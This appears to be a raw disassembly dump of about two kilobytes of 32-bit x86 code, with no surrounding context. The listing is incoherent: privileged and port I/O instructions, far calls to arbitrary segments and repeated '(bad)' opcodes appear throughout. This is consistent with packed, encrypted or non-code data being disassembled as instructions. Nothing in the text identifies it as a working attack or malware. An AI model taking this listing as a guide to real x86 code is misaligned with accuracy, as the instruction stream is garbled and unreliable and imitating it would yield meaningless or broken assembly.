  41f48d:	bound  ebx,QWORD PTR [ebx+eax*2+0x8]
  41f491:	test   al,0x2c
  41f493:	imul   esi,DWORD PTR [ebx],0xf
  41f496:	mov    BYTE PTR [ebp+0x44edf4d3],cl
  41f49c:	imul   esi,DWORD PTR [eax],0x19
  41f49f:	push   esi
  41f4a0:	xor    bh,bl
  41f4a2:	mov    al,0xc0
  41f4a4:	into   
  41f4a5:	(bad)  
  41f4a6:	push   esi
  41f4a7:	adc    BYTE PTR [edx+0x301ff78f],ah
  41f4ad:	repnz fnstenv [ebp-0x70]
  41f4b1:	retf   0x4dc0
  41f4b4:	sahf   
  41f4b5:	mov    edi,DWORD PTR [eax]
  41f4b7:	lods   eax,DWORD PTR ds:[esi]
  41f4b8:	in     al,0xd1
  41f4ba:	leave  
  41f4bb:	in     eax,dx
  41f4bc:	jp     0x41f51c
  41f4be:	push   eax
  41f4bf:	inc    eax
  41f4c0:	and    BYTE PTR [edi],dl
  41f4c2:	in     eax,dx
  41f4c3:	das    
  41f4c4:	ins    BYTE PTR es:[edi],dx
  41f4c5:	add    DWORD PTR [esi],esp
  41f4c7:	mov    BYTE PTR [eax-0x43],ch
  41f4ca:	clc    
  41f4cb:	test   al,0x98
  41f4cd:	imul   esi,edi,0x961ab764
  41f4d3:	fdiv   st,st(7)
  41f4d5:	sahf   
  41f4d6:	add    ebx,DWORD PTR [ebx+0x32]
  41f4d9:	mov    eax,0x64b625f2
  41f4de:	jmp    0xbe6e:0x5c39b0f0
  41f4e5:	push   eax
  41f4e6:	mov    ah,0x8a
  41f4e8:	in     al,dx
  41f4e9:	pop    ebp
  41f4ea:	pop    edx
  41f4eb:	fld    QWORD PTR [ecx]
  41f4ed:	xor    eax,0x37d253a3
  41f4f2:	inc    ebx
  41f4f3:	out    dx,al
  41f4f4:	into   
  41f4f5:	rol    edi,0x19
  41f4f8:	or     BYTE PTR [edi+ebx*2+0x3ae1eaae],0x25
  41f500:	jmp    0x41f4b8
  41f502:	test   dh,0xa4
  41f505:	jmp    0xb48f75dd
  41f50a:	ins    DWORD PTR es:[edi],dx
  41f50b:	jbe    0x41f531
  41f50d:	ins    DWORD PTR es:[edi],dx
  41f50e:	stos   DWORD PTR es:[edi],eax
  41f50f:	(bad)  
  41f510:	mov    ds:0x72e54bdd,eax
  41f515:	mov    ah,0x69
  41f517:	push   ebx
  41f518:	fcmovnu st,st(0)
  41f51a:	aad    0xd4
  41f51c:	out    dx,al
  41f51d:	add    BYTE PTR [edi-0x5b],ah
  41f520:	push   0x6e
  41f522:	dec    esi
  41f523:	adc    bl,BYTE PTR [ebx+0x27]
  41f526:	sbb    al,0x4
  41f528:	mov    esp,0xbaf8db51
  41f52d:	mov    ds:0x43b45d06,eax
  41f532:	lea    ecx,[eax]
  41f534:	add    ch,BYTE PTR [esi]
  41f536:	inc    eax
  41f537:	sbb    eax,0x2b3f6ff4
  41f53c:	loop   0x41f575
  41f53e:	pop    edi
  41f53f:	ins    BYTE PTR es:[edi],dx
  41f540:	pop    ecx
  41f541:	dec    ecx
  41f542:	pop    DWORD PTR [esi]
  41f544:	cmc    
  41f545:	add    ebx,DWORD PTR [ecx+0x75]
  41f548:	inc    esp
  41f549:	or     eax,0x56091be2
  41f54e:	shr    DWORD PTR [edx-0x35],1
  41f551:	fs in  eax,0x91
  41f554:	push   esi
  41f555:	push   esp
  41f556:	loop   0x41f4e7
  41f558:	adc    esp,DWORD PTR [edi+ebx*4+0x2a]
  41f55c:	in     al,0xed
  41f55e:	call   0xd707:0x7f34927d
  41f565:	jo     0x41f5a4
  41f567:	retf   0x3118
  41f56a:	add    ch,BYTE PTR [edx]
  41f56c:	ret    
  41f56d:	add    ch,BYTE PTR [edi+0x12]
  41f570:	(bad)  
  41f571:	xchg   esi,eax
  41f572:	jl     0x41f5c4
  41f574:	mov    bh,0x99
  41f576:	xchg   ebp,eax
  41f577:	dec    ebp
  41f578:	popa   
  41f579:	mov    ecx,0xfd8a4883
  41f57e:	or     esp,DWORD PTR [edi+0x63]
  41f581:	shl    esp,cl
  41f583:	gs inc ebx
  41f585:	outs   dx,DWORD PTR ds:[esi]
  41f586:	arpl   WORD PTR [ecx+0x4d96efcf],bp
  41f58c:	pop    edx
  41f58d:	pushf  
  41f58e:	ss loop 0x41f5d8
  41f591:	inc    ebp
  41f592:	fadd   QWORD PTR [ebp-0x76]
  41f595:	sub    BYTE PTR [edi-0x1db069a],bh
  41f59b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f59c:	cmp    bh,dh
  41f59e:	jne    0x41f5fb
  41f5a0:	daa    
  41f5a1:	aam    0xd6
  41f5a3:	ins    DWORD PTR es:[edi],dx
  41f5a4:	repnz add bh,BYTE PTR [ecx+0x10]
  41f5a8:	cmp    al,0x36
  41f5aa:	add    esp,DWORD PTR [eax+0x3e9bbdf3]
  41f5b0:	dec    edi
  41f5b1:	sub    eax,0xbe1d8adf
  41f5b6:	in     eax,dx
  41f5b7:	popa   
  41f5b8:	jp     0x41f5b9
  41f5ba:	fistp  QWORD PTR [esi+0x638b2afd]
  41f5c0:	pop    edx
  41f5c1:	add    BYTE PTR [ebx+eax*2+0x6b],cl
  41f5c5:	add    eax,0x4f849206
  41f5ca:	sub    eax,0xb84af45b
  41f5cf:	cmp    eax,DWORD PTR [ecx+edx*4+0x77fcd726]
  41f5d6:	jg     0x41f62a
  41f5d8:	gs call 0x1462bca1
  41f5de:	pop    esi
  41f5df:	shl    DWORD PTR [ebx-0x74],0xa6
  41f5e3:	test   DWORD PTR [ebx+0x2122b59c],0x9a65e2e2
  41f5ed:	sub    ch,BYTE PTR [edi]
  41f5ef:	jl     0x41f5d5
  41f5f1:	daa    
  41f5f2:	es jg  0x41f603
  41f5f5:	add    DWORD PTR [edi+0x6d],ebp
  41f5f8:	lahf   
  41f5f9:	loop   0x41f5df
  41f5fb:	add    al,0x2b
  41f5fd:	pop    ds
  41f5fe:	inc    edi
  41f5ff:	mov    ds:0xce2459f,al
  41f604:	sub    BYTE PTR [ebx-0x6b],ch
  41f607:	mov    edi,0x78d47124
  41f60c:	popf   
  41f60d:	pop    edx
  41f60e:	sar    BYTE PTR [ecx],cl
  41f610:	mov    ah,0xc5
  41f612:	sti    
  41f613:	cs xchg ebp,eax
  41f615:	mov    al,0xa4
  41f617:	and    eax,0xdb72d7d0
  41f61c:	call   0x695f:0x5f44d3cd
  41f623:	imul   edx,DWORD PTR [esi],0xffffffcb
  41f626:	mov    ebx,0x5b6c0a9b
  41f62c:	(bad)
  41f62f:	push   eax
  41f630:	xchg   ebx,eax
  41f631:	ds add al,0x10
  41f634:	pop    esi
  41f635:	push   esi
  41f636:	mov    eax,0x32fd557f
  41f63b:	pop    ss
  41f63c:	mov    esp,0x1b6bab0b
  41f641:	retf   0x13e5
  41f644:	outs   dx,DWORD PTR ds:[esi]
  41f645:	mov    esp,0x6508ccd1
  41f64a:	jl     0x41f628
  41f64c:	sbb    al,0xc0
  41f64e:	ins    DWORD PTR es:[edi],dx
  41f64f:	dec    edx
  41f650:	enter  0xd4e3,0xdf
  41f654:	jo     0x41f64c
  41f656:	lods   al,BYTE PTR ds:[esi]
  41f657:	jl     0x41f6be
  41f659:	(bad)  
  41f65b:	(bad)  
  41f65c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f65d:	jmp    0x6731b07f
  41f662:	push   ds
  41f663:	lods   al,BYTE PTR ds:[esi]
  41f664:	retf   0xa6d8
  41f667:	addr16 jae 0x41f5f7
  41f66a:	rol    DWORD PTR [edx-0x18],cl
  41f66d:	push   esp
  41f66e:	test   ebp,edx
  41f670:	jae    0x41f64a
  41f672:	out    0x12,al
  41f674:	ret    0x226f
  41f677:	outs   dx,BYTE PTR ds:[esi]
  41f678:	xor    edx,DWORD PTR [ebx-0x66]
  41f67b:	pusha  
  41f67c:	and    esi,DWORD PTR [edx]
  41f67e:	push   esp
  41f67f:	das    
  41f680:	aam    0x4d
  41f682:	das    
  41f683:	(bad)  
  41f684:	cmp    BYTE PTR ds:0x4656d6e1,ah
  41f68a:	outs   dx,DWORD PTR ds:[esi]
  41f68b:	rol    BYTE PTR [ecx+0x32],1
  41f68e:	(bad)  
  41f68f:	push   edx
  41f690:	retf   0xc442
  41f693:	clc    
  41f694:	push   cs
  41f695:	ss push edi
  41f697:	sub    eax,0x21c922ed
  41f69c:	sbb    eax,0x6a002c7a
  41f6a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6a2:	loop   0x41f671
  41f6a4:	retf   0xd05e
  41f6a7:	xchg   esp,eax
  41f6a8:	cmp    BYTE PTR ds:0xa437d6d7,dh
  41f6ae:	sahf   
  41f6af:	mov    ds:0xdcb44dc9,al
  41f6b4:	cmp    DWORD PTR [edi+0x71cfb9a],esp
  41f6ba:	inc    ebp
  41f6bb:	dec    edx
  41f6bc:	push   ss
  41f6bd:	cmp    eax,0xb0191dd0
  41f6c2:	out    dx,eax
  41f6c3:	push   edi
  41f6c4:	int3   
  41f6c5:	(bad)  
  41f6c6:	mov    ebp,0xb84c6a5a
  41f6cb:	outs   dx,BYTE PTR ds:[esi]
  41f6cc:	lods   eax,DWORD PTR ds:[esi]
  41f6cd:	outs   dx,BYTE PTR ds:[esi]
  41f6ce:	push   ebp
  41f6cf:	(bad)  
  41f6d0:	pop    esp
  41f6d1:	aam    0x4e
  41f6d3:	lods   eax,DWORD PTR ds:[esi]
  41f6d4:	sbb    dl,ah
  41f6d6:	push   ebx
  41f6d7:	js     0x41f6bc
  41f6d9:	aas    
  41f6da:	and    eax,0xc5f6ab86
  41f6df:	shl    dl,0xdf
  41f6e2:	mov    eax,ds:0xbc700079
  41f6e7:	int    0x27
  41f6e9:	div    esi
  41f6eb:	in     al,0xe2
  41f6ed:	mov    bh,0xc3
  41f6ef:	mov    eax,0x82bf0604
  41f6f4:	scas   al,BYTE PTR es:[edi]
  41f6f5:	lea    ebp,[ecx]
  41f6f7:	sbb    al,0x56
  41f6f9:	pop    ds
  41f6fa:	xchg   edx,eax
  41f6fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6fc:	je     0x41f76a
  41f6fe:	push   edx
  41f6ff:	or     BYTE PTR [esi],dl
  41f701:	mov    ds:0x78f3638b,al
  41f706:	mov    dh,0xbc
  41f708:	push   eax
  41f709:	bound  esp,QWORD PTR [edx+0x3415dacb]
  41f70f:	sahf   
  41f710:	mov    edi,0x8e1bcca8
  41f715:	sbb    DWORD PTR [eax+esi*1-0x7a5a7e5e],0x1c
  41f71d:	je     0x41f6e2
  41f71f:	int    0x83
  41f721:	adc    DWORD PTR [bp+di+0x16],edi
  41f725:	dec    ebx
  41f726:	push   esi
  41f727:	jle    0x41f6f8
  41f729:	stos   DWORD PTR es:[edi],eax
  41f72a:	xor    esp,esi
  41f72c:	in     eax,dx
  41f72d:	aas    
  41f72e:	sahf   
  41f72f:	ds stos DWORD PTR es:[edi],eax
  41f731:	nop
  41f732:	and    esi,DWORD PTR [eax]
  41f734:	jl     0x41f74c
  41f736:	dec    esp
  41f737:	cli    
  41f738:	int3   
  41f739:	jmp    0xfecd:0x5f4ed5bb
  41f740:	js     0x41f706
  41f742:	addr16 mov eax,ds:0x9e85
  41f746:	mov    ds:0x77e6b1a3,eax
  41f74b:	and    dl,BYTE PTR [ecx-0x42bd093f]
  41f751:	fadd   DWORD PTR [eax]
  41f753:	push   esi
  41f754:	pop    ds
  41f755:	jne    0x41f6fb
  41f757:	dec    edx
  41f758:	pop    ss
  41f759:	jb     0x41f7b0
  41f75b:	mov    WORD PTR [ecx-0x1d33c294],?
  41f761:	jge    0x41f6fa
  41f763:	and    DWORD PTR [esi],eax
  41f765:	(bad)  
  41f766:	sub    ecx,DWORD PTR [esi+0x57]
  41f769:	leave  
  41f76a:	xor    al,0xc9
  41f76c:	and    eax,DWORD PTR [ebx]
  41f76e:	dec    esp
  41f76f:	mov    bl,0x2d
  41f771:	clc    
  41f772:	fwait
  41f773:	std    
  41f774:	ins    DWORD PTR es:[edi],dx
  41f775:	icebp  
  41f776:	cmp    BYTE PTR [esi-0x4e],bl
  41f779:	mov    esi,esi
  41f77b:	fidiv  WORD PTR [edi]
  41f77d:	push   eax
  41f77e:	aad    0xc0
  41f780:	adc    eax,0xe85b971d
  41f785:	(bad)  [eax+edi*2+0x7c2b0070]
  41f78c:	shl    BYTE PTR [eax],1
  41f78e:	icebp  
  41f78f:	mov    al,ds:0xe85a5174
  41f794:	jo     0x41f718
  41f796:	repz idiv DWORD PTR ds:0x7c30eee5
  41f79d:	fcmove st,st(6)
  41f79f:	xchg   ecx,eax
  41f7a0:	leave  
  41f7a1:	mov    edi,0x9350fd4f
  41f7a6:	(bad)  [esi]
  41f7a8:	xor    BYTE PTR fs:[edi+0x5b526f9a],cl
  41f7af:	and    BYTE PTR [ebx],ch
  41f7b1:	fcmove st,st(7)
  41f7b3:	ds cli 
  41f7b5:	mov    ah,0xb4
  41f7b7:	jmp    0x41f830
  41f7b9:	push   esi
  41f7ba:	outs   dx,BYTE PTR ds:[esi]
  41f7bb:	mov    bh,0xaf
  41f7bd:	dec    eax
  41f7be:	daa    
  41f7bf:	sti    
  41f7c0:	pop    ss
  41f7c1:	jp     0x41f760
  41f7c3:	aad    0x7c
  41f7c5:	pushf  
  41f7c6:	bound  eax,QWORD PTR [ebp+0x23]
  41f7c9:	and    al,0xe6
  41f7cb:	test   al,0xcb
  41f7cd:	test   BYTE PTR [ebx],bl
  41f7cf:	cli    
  41f7d0:	fsub   DWORD PTR [edi-0x1]
  41f7d3:	xor    bh,bh
  41f7d5:	mov    DWORD PTR [eax],ecx
  41f7d7:	cdq    
  41f7d8:	stc    
  41f7d9:	je     0x41f795
  41f7db:	cwde   
  41f7dc:	enter  0xcb47,0xac
  41f7e0:	or     BYTE PTR [eax+0x50],dh
  41f7e3:	out    dx,al
  41f7e4:	lea    esp,[eax]
  41f7e6:	pusha  
  41f7e7:	lock idiv BYTE PTR [esi+0x7c]
  41f7eb:	outs   dx,BYTE PTR ds:[esi]
  41f7ec:	jl     0x41f7c4
  41f7ee:	sub    bl,al
  41f7f0:	out    dx,al
  41f7f1:	fcmovnbe st,st(2)
  41f7f3:	sub    dh,BYTE PTR [esi]
  41f7f5:	add    al,dh
  41f7f7:	add    ebx,DWORD PTR [edx-0x39]
  41f7fa:	dec    eax
  41f7fb:	lss    ebx,FWORD PTR [edi+0x9e0b622]
  41f802:	xor    eax,0xfcbd062c
  41f807:	mov    esp,0xcb0e2857
  41f80c:	inc    esp
  41f80d:	or     DWORD PTR [ebx+edi*2],ebx
  41f810:	jmp    0x41f7d3
  41f812:	and    BYTE PTR [edi-0x1e947fbc],ch
  41f818:	mov    cl,0x3a
  41f81a:	or     ecx,edx
  41f81c:	test   eax,0xe4deeadf
  41f821:	add    ebx,DWORD PTR [edx-0x31]
  41f824:	pop    eax
  41f825:	fadd   st,st(3)
  41f827:	pop    es
  41f828:	push   cs
  41f829:	xchg   ebp,eax
  41f82a:	dec    esp
  41f82b:	lea    eax,[eax+0x259bdd1]
  41f831:	in     al,dx
  41f832:	xor    BYTE PTR [edi+0x7b],dh
  41f835:	neg    BYTE PTR [ebx+0x38]
  41f838:	mov    dh,0xd4
  41f83a:	ds xchg esp,eax
  41f83c:	or     al,0x73
  41f83e:	retf   
  41f83f:	mov    eax,ds:0x5304e38
  41f844:	and    DWORD PTR ds:0xe6b58679,esi
  41f84a:	mov    cl,0x54
  41f84c:	push   ss
  41f84d:	in     al,0xfc
  41f84f:	xor    dl,BYTE PTR [eax+0x33]
  41f852:	add    ch,ch
  41f854:	call   0x306b:0xee2a9722
  41f85b:	add    dh,BYTE PTR [ebx]
  41f85d:	mov    al,ds:0x12d1a7e8
  41f862:	jg     0x41f886
  41f864:	cs lahf 
  41f866:	cmc    
  41f867:	inc    ebx
  41f868:	pop    edi
  41f869:	sahf   
  41f86a:	add    BYTE PTR [eax+0x8eea099],0x4e
  41f871:	lock fist WORD PTR [edx+ebx*4+0x4a96765e]
  41f879:	sahf   
  41f87a:	and    DWORD PTR [ecx+0x483127e4],edx
  41f880:	mov    dl,0xc5
  41f882:	fst    QWORD PTR ds:0x6a431dd9
  41f888:	(bad)
  41f88b:	daa    
  41f88c:	push   ebp
  41f88d:	inc    esp
  41f88e:	in     al,dx
  41f88f:	sbb    ecx,eax
  41f891:	mov    ebp,0xdffa5272
  41f896:	pushf  
  41f897:	inc    esp
  41f898:	sub    DWORD PTR [ebp+0x3dff773e],esi
  41f89e:	loopne 0x41f845
  41f8a0:	test   BYTE PTR [esi-0x65],bl
  41f8a3:	xor    eax,0xa50f0a47
  41f8a8:	lea    esi,[ecx]
  41f8aa:	xchg   DWORD PTR [ebx*4-0x772dd54e],edi
  41f8b1:	dec    edi
  41f8b2:	push   0x34392d5b
  41f8b7:	retf   0x9930
  41f8ba:	or     esi,DWORD PTR [ebx]
  41f8bc:	push   edi
  41f8bd:	lea    edx,[edi-0x56]
  41f8c0:	stos   DWORD PTR es:[edi],eax
  41f8c1:	dec    ebp
  41f8c2:	cli    
  41f8c3:	dec    eax
  41f8c4:	sub    bl,BYTE PTR [ecx-0x1d]
  41f8c7:	sub    ah,BYTE PTR [eax-0x4b]
  41f8ca:	jbe    0x41f8cc
  41f8cc:	sbb    BYTE PTR [ebx-0x14],dh
  41f8cf:	aam    0x73
  41f8d1:	sbb    esi,DWORD PTR [esp+eax*2-0x7295302d]
  41f8d8:	fs scas al,BYTE PTR es:[edi]
  41f8da:	or     esi,edi
  41f8dc:	cmovno esp,DWORD PTR [ebx+edx*4]
  41f8e0:	pop    es
  41f8e1:	mov    al,0x98
  41f8e3:	in     al,0xae
  41f8e5:	jne    0x41f929
  41f8e7:	dec    edx
  41f8e8:	xor    DWORD PTR [eax+edx*2],eax
  41f8eb:	fsub   st(7),st
  41f8ed:	in     al,0x60
  41f8ef:	fisttp QWORD PTR [edi+0x6a373a2c]
  41f8f5:	retf   
  41f8f6:	push   DWORD PTR [edx]
  41f8f8:	int3   
  41f8f9:	out    0xd6,eax
  41f8fb:	jo     0x41f96e
  41f8fd:	rol    BYTE PTR ss:[eax-0x70],0xba
  41f902:	idiv   DWORD PTR [edi]
  41f904:	fdivr  DWORD PTR [ecx+0x1e]
  41f907:	aad    0xab
  41f909:	sbb    eax,0x6d803c46
  41f90e:	lahf   
  41f90f:	fcmovu st,st(4)
  41f911:	adc    eax,0x5bbe5a3c
  41f916:	call   0x47b5:0x33b1b41c
  41f91d:	xor    BYTE PTR [ebx],al
  41f91f:	inc    esi
  41f920:	in     al,0x45
  41f922:	sub    ch,bl
  41f924:	sbb    ah,ch
  41f926:	or     eax,DWORD PTR [edi+0x45]
  41f929:	xchg   DWORD PTR [ecx+edx*4],ebx
  41f92c:	push   edi
  41f92d:	(bad)  
  41f92e:	aaa    
  41f92f:	popa   
  41f930:	jno    0x41f94c
  41f932:	mov    bh,al
  41f934:	(bad)  
  41f935:	out    0x31,eax
  41f937:	xor    ebp,esi
  41f939:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f93a:	pop    es
  41f93b:	imul   esi,edx,0x4805801f
  41f941:	mov    esp,0x1c2c757f
  41f946:	or     eax,0xb07778bd
  41f94b:	test   eax,0x311d59da
  41f950:	push   0x78
  41f952:	out    dx,eax
  41f953:	jno    0x41f9ae
  41f955:	mov    esi,0xa28d5d1b
  41f95a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f95b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f95c:	test   al,0x18
  41f95e:	mov    ds:0x9187f9bb,eax
  41f963:	xchg   ebx,eax
  41f964:	or     eax,0x24ae1290
  41f969:	cmp    ebx,ecx
  41f96b:	pop    edx
  41f96c:	sahf   
  41f96d:	or     eax,0x6d21f1c6
  41f972:	cmc    
  41f973:	mov    ch,0xcb
  41f975:	jmp    0x16042a04
  41f97a:	imul   ebx,DWORD PTR [edi+ebx*4],0xffffffda
  41f97e:	cmp    dh,BYTE PTR [ecx]
  41f980:	adc    BYTE PTR [ecx+0x63],bl
  41f983:	pop    ebx
  41f984:	lods   al,BYTE PTR ds:[esi]
  41f985:	adc    dl,BYTE PTR [ebx-0x50bff481]
  41f98b:	leave  
  41f98c:	sub    ecx,DWORD PTR [ebp+0x5b]
  41f98f:	ss out dx,eax
  41f991:	pop    ebx
  41f992:	xor    esi,DWORD PTR [esi]
  41f994:	clc    
  41f995:	aad    0x90
  41f997:	pusha  
  41f998:	lahf   
  41f999:	mov    bh,0x32
  41f99b:	mov    ah,0xf3
  41f99d:	cdq    
  41f99e:	inc    ecx
  41f99f:	out    dx,al
  41f9a0:	(bad)  
  41f9a1:	jle    0x41f927
  41f9a3:	inc    edi
  41f9a4:	jp     0x41f9fa
  41f9a6:	xchg   ecx,eax
  41f9a7:	jg     0x41fa23
  41f9a9:	jae    0x41f952
  41f9ab:	int3   
  41f9ac:	pop    esi
  41f9ad:	ss iret 
  41f9af:	test   DWORD PTR [eax],esp
  41f9b1:	push   eax
  41f9b2:	push   0x7e3b85f2
  41f9b7:	inc    ecx
  41f9b8:	lods   eax,DWORD PTR ds:[esi]
  41f9b9:	fdivr  st,st(2)
  41f9bb:	jne    0x41f9b9
  41f9bd:	popf   
  41f9be:	inc    edx
  41f9c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9c1:	clc    
  41f9c2:	push   eax
  41f9c3:	js     0x41f952
  41f9c5:	cmp    al,0xd2
  41f9c7:	mov    edi,0x591350a5
  41f9cc:	and    eax,0x71dc7f7a
  41f9d1:	jb     0x41f955
  41f9d3:	sar    DWORD PTR [esi+esi*4-0x54defd24],1
  41f9da:	push   esp
  41f9db:	push   ds
  41f9dc:	push   ebp
  41f9dd:	and    al,0x16
  41f9df:	mov    ecx,0x685dad16
  41f9e4:	or     dh,BYTE PTR [edi-0xf]
  41f9e7:	addr16 sbb dh,ch
  41f9ea:	neg    BYTE PTR [edx+0x603588b3]
  41f9f0:	pop    ebp
  41f9f1:	mov    al,0xc9
  41f9f3:	mov    al,0xa5
  41f9f5:	xchg   esp,eax
  41f9f6:	wbinvd 
  41f9f8:	mov    esp,edi
  41f9fa:	mov    BYTE PTR [edi+0x64a52cf0],0x9
  41fa01:	jo     0x41f9cb
  41fa03:	icebp  
  41fa04:	clc    
  41fa05:	xchg   ecx,eax
  41fa06:	rol    edi,1
  41fa08:	fdivr  QWORD PTR [edi-0x27db9e44]
  41fa0e:	xlat   BYTE PTR ds:[ebx]
  41fa10:	add    ebp,DWORD PTR [ebx-0x12]
  41fa13:	pop    ecx
  41fa14:	out    0x77,al
  41fa16:	and    al,0x6d
  41fa18:	sbb    bh,BYTE PTR [eax]
  41fa1a:	mov    ds:0xb5421fc2,al
  41fa1f:	popf   
  41fa20:	jbe    0x41fa4f
  41fa22:	sbb    eax,0x840da969
  41fa27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa28:	enter  0x3e27,0x15
  41fa2c:	nop
  41fa2d:	adc    DWORD PTR [eax+0x30fa5a7e],ebp
  41fa33:	jb     0x41fa1b
  41fa35:	fwait
  41fa36:	nop
  41fa37:	sahf   
  41fa38:	shl    BYTE PTR [ecx+esi*4-0x27e5da4d],1
  41fa3f:	push   0x2f456e92
  41fa44:	sbb    al,BYTE PTR ds:[esi-0x22a919f6]
  41fa4b:	je     0x41fa90
  41fa4d:	jae    0x41faa1
  41fa4f:	xor    eax,0x253b1fa8
  41fa54:	sbb    DWORD PTR [eax],edx
  41fa56:	stos   BYTE PTR es:[edi],al
  41fa57:	mov    esi,0x9b69987e
  41fa5c:	mov    edi,0x3483d6d6
  41fa61:	test   eax,0x3e1d0030
  41fa66:	mov    ch,0xfe
  41fa68:	outs   dx,DWORD PTR ds:[esi]
  41fa69:	cmp    edx,DWORD PTR [ebx-0x2a]
  41fa6c:	mov    dl,0x6c
  41fa6e:	cmp    BYTE PTR [edi],dl
  41fa70:	dec    esi
  41fa71:	test   eax,0xe7baa73a
  41fa76:	push   es
  41fa77:	push   ebp
  41fa78:	xchg   bl,bl
  41fa7a:	mov    al,0xcc
  41fa7c:	aaa    
  41fa7d:	inc    edi
  41fa7e:	mov    BYTE PTR [ecx],bl
  41fa80:	loopne 0x41fac1
  41fa82:	dec    edx
  41fa83:	in     eax,0xd6
  41fa85:	inc    edx
  41fa86:	aaa    
  41fa87:	and    eax,0xb9db0525
  41fa8c:	in     eax,dx
  41fa8d:	bound  edi,QWORD PTR [eax-0xa]
  41fa90:	arpl   WORD PTR [edx-0x32cd7aa1],bp
  41fa96:	imul   ebp,DWORD PTR [edx+0x76e8f7f2],0xffffffa4
  41fa9d:	and    BYTE PTR [edx+0x7e32275f],0xe1
  41faa4:	mov    ah,0xfb
  41faa6:	outs   dx,BYTE PTR ds:[esi]
  41faa7:	jns    0x41fa35
  41faa9:	mov    ah,BYTE PTR [ecx-0x73]
  41faac:	in     eax,0x45
  41faae:	push   esi
  41faaf:	clc    
  41fab0:	popf   
  41fab1:	add    edx,ecx
  41fab3:	xchg   ecx,eax
  41fab4:	call   0x4e57bd45
  41fab9:	mov    ah,0x13
  41fabb:	cmp    edi,esi
  41fabd:	int    0x40
  41fabf:	stos   BYTE PTR es:[edi],al
  41fac0:	les    ecx,FWORD PTR [esi-0x3281f5e2]
  41fac6:	sbb    al,BYTE PTR [ebx+eax*8]
  41fac9:	js     0x41fb2c
  41facb:	cmp    ebx,ebx
  41facd:	jge    0x41fb04
  41facf:	dec    esp
  41fad0:	pop    esp
  41fad1:	leave  
  41fad2:	adc    eax,0xabf1c6b
  41fad8:	push   edx
  41fad9:	dec    esi
  41fada:	cli    
  41fadb:	gs mov ebp,0x64b0dc9d
  41fae1:	lods   eax,DWORD PTR ds:[esi]
  41fae2:	test   eax,0x74598a5c
  41fae7:	test   DWORD PTR [ecx-0x47],eax
  41faea:	ret    
  41faeb:	ror    DWORD PTR [ecx],1
  41faed:	call   0x1324:0xb5038754
  41faf4:	lea    esp,[ebp-0x74]
  41faf7:	mov    ebp,0x6f8e6c58
  41fafc:	jae    0x41fad1
  41fafe:	call   0x1c7c:0x3842b241
  41fb05:	and    al,0xb6
  41fb07:	popa   
  41fb08:	jge    0x41faee
  41fb0a:	push   es
  41fb0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb0c:	xchg   esp,eax
  41fb0d:	pusha  
  41fb0e:	scas   eax,DWORD PTR es:[edi]
  41fb0f:	jb     0x41fab8
  41fb11:	mov    DWORD PTR [esi-0x5b4f8be9],edx
  41fb17:	xor    bh,BYTE PTR [ebx+0x3b]
  41fb1a:	lahf   
  41fb1b:	imul   DWORD PTR [eax]
  41fb1d:	sbb    BYTE PTR [eax-0x21],0x5a
  41fb21:	jae    0x41fadc
  41fb23:	inc    esp
  41fb24:	push   esi
  41fb25:	or     ebp,ecx
  41fb27:	aas    
  41fb28:	jge    0x41faab
  41fb2a:	sub    BYTE PTR ds:[ecx+0x32a9e80f],dl
  41fb31:	(bad)  
  41fb32:	fdivr  QWORD PTR [ecx+0x6a]
  41fb35:	daa    
  41fb36:	adc    al,0x44
  41fb38:	shr    BYTE PTR [edi-0x75],1
  41fb3b:	rcl    DWORD PTR [edi],0x97
  41fb3e:	cmp    eax,0x3dab7113
  41fb43:	nop
  41fb44:	out    dx,eax
  41fb45:	leave  
  41fb46:	xor    esp,esp
  41fb48:	and    DWORD PTR [ebx],eax
  41fb4a:	mov    WORD PTR [edx+eax*1],fs
  41fb4d:	icebp  
  41fb4e:	rol    BYTE PTR ds:0x82204386,0xd7
  41fb55:	jecxz  0x41fb11
  41fb57:	push   edx
  41fb58:	mov    esi,DWORD PTR ds:0x9b5410c7
  41fb5e:	js     0x41fbcd
  41fb60:	ret    0xde36
  41fb63:	xlat   BYTE PTR ss:[ebx]
  41fb65:	and    BYTE PTR [ecx-0x6e3948fc],dl
  41fb6b:	dec    ebp
  41fb6c:	add    al,BYTE PTR [esp+edi*1]
  41fb6f:	arpl   WORD PTR ds:0x11b32f29,dx
  41fb75:	jne    0x41fbd4
  41fb77:	les    ebx,FWORD PTR [edx-0x5cb0635d]
  41fb7d:	push   ds
  41fb7e:	jo     0x41fbb9
  41fb80:	iret   
  41fb81:	daa    
  41fb82:	adc    dh,BYTE PTR [eax+0x2fffe9e7]
  41fb88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb89:	test   BYTE PTR [edi+0x2c],al
  41fb8c:	scas   eax,DWORD PTR es:[edi]
  41fb8d:	mov    edi,0x4221ce4c
  41fb92:	hlt    
  41fb93:	mov    bh,0x8f
  41fb95:	mov    dh,0x8b
  41fb97:	shl    DWORD PTR [ebx-0x22ab2b01],cl
  41fb9d:	mov    cl,0x1b
  41fb9f:	dec    edx
  41fba0:	aas    
  41fba1:	push   eax
  41fba2:	(bad)  
  41fba4:	rcl    BYTE PTR [edx+0x68503678],1
  41fbaa:	jmp    0x2bb67fd7
  41fbaf:	inc    edi
  41fbb0:	jmp    0xee58a745
  41fbb5:	sub    bh,al
  41fbb7:	daa    
  41fbb8:	mov    edx,0x310eeae5
  41fbbd:	pop    ds
  41fbbe:	push   0xed0415e8
  41fbc3:	and    ah,BYTE PTR [ebx+0x68]
  41fbc6:	push   esp
  41fbc7:	xor    eax,0xa206a0d3
  41fbcc:	dec    ebp
  41fbcd:	xchg   esi,eax
  41fbce:	stos   BYTE PTR es:[edi],al
  41fbcf:	sti    
  41fbd0:	(bad)  
  41fbd1:	xchg   ebp,eax
  41fbd2:	dec    ecx
  41fbd3:	mov    dl,0x93
  41fbd5:	push   0xc7d3a278
  41fbda:	pop    esi
